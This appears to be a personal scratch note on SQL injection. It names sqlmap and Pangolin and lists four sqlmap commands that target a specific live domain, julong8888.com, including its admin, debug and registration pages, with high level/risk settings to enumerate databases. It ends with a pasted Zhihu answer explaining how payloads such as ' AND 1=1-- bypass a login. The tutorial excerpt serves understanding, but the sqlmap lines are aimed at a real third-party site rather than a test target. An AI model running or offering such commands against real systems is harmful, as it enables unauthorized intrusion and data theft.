



sqlmap  Pangolin



SHOW FULL PROCESSLIST;

1
python sqlmap.py -u "http://julong8888.com/myhome.php" --forms  –level=5 –risk=3 –dbs
python sqlmap.py -u "http://admin.julong8888.com/" --forms  –level=5 –risk=3 –dbs
python sqlmap.py -u "http://admin.julong8888.com/index_for_debug.html" --forms  –level=10 –risk=5 –dbs
python sqlmap.py -u "http://julong8888.com/reg.php" –data "zcname=adminxx&zcpwd1=admin4321&zcturename=姓名&zctel=13725676546" –level=5 –risk=3 –dbs


SELECT uid,username FROM user WHERE username='plhwin'
但是，如果用户在浏览器里把传入的username参数变为 plhwin';SHOW TABLES-- hack，也就是当URL变为 http://localhost/test/userinfo.php?username=plhwin';SHOW TABLES-- hack 的时候，此时我们程序实际执行的SQL语句变成了：
SELECT uid,username FROM user WHERE username='plhwin';SHOW TABLES-- hack'



SELECT uid,username FROM user WHERE username='plhwin' AND password='e10adc3949ba59abbe56e057f20f883e'
上面语句没有任何问题，可以看到页面打印出了登录成功后的会员信息，但如果有捣蛋鬼输入的用户名为 plhwin' AND 1=1-- hack，密码随意输入，比如 aaaaaa，那么拼接之后的SQL查询语句就变成了如下内容：
SELECT uid,username FROM user WHERE username='plhwin' AND 1=1-- hack' AND password='0b4e7a0e5fe84ad35fb5f95b9ceeac79'

执行上面的SQL语句，因为 1=1 是永远成立的条件，这意味着黑客只需要知道别人的会员名，无需知道密码就能顺利登录到系统。

作者：潘良虎
链接：https://www.zhihu.com/question/22953267/answer/80141632
来源：知乎
著作权归作者所有，转载请联系作者获得授权。


